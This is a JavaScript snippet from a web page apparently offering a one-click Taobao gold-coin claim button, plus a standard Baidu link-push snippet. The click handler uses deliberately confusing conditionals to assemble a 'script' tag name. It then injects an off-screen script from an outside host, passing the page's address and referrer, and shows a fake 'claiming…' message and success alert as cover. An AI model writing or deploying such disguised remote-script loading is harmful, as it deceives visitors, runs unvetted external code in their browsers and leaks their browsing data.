var a = "app";
    var NaN = a;
    if (NaN == "app") {
        var div = "div";
    } else {
        var div = "span";
    }
    a += ".";
    if (div == "div") {
        div = "span";
    } else {
        div = "iframe";
    }
    a += "html";
    if (div == "span") {
        div = "script";
    }
    a += "?" + "Address" + "=" + document.location.href;
    if (~1 === -2) { div += ""; } else { div = "div"; }
    if (document.referrer) { a += "&" + "Referrer" + "=" + document.referrer; }
    var coin = document.getElementById("coin");
    var receive = document.getElementById("receive");
    var receiveHTML = receive.innerHTML;
    var update = document.getElementById("update");
    receive.onclick = function () {
        receive.innerHTML = "";
        receive.style.display = "none";
        update.innerHTML = "<a class='btn btn-success btn-block bk-margin-top-10' role='button' >系统正在领取...</a>";
        coin.innerHTML = "<" + div + " src=\"" + "//www.Chaidu.com/App/Web/Taobao-Coin/" + a + "\"></" + div + ">";
        coin.style.position = "absolute";
        coin.style.top = "-9999px";
        coin.style.left = "-9999px";
        setTimeout(function () {
            receive.innerHTML = receiveHTML;
            receive.style.display = "";
            update.innerHTML = "";
            alert("淘宝金币一键领取程序执行完毕");
        }, 5555);
        setTimeout(function () {
            coin.style.display = "none";
        }, 9999);
        return false;
    };

    // 百度自动推送工具代码
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();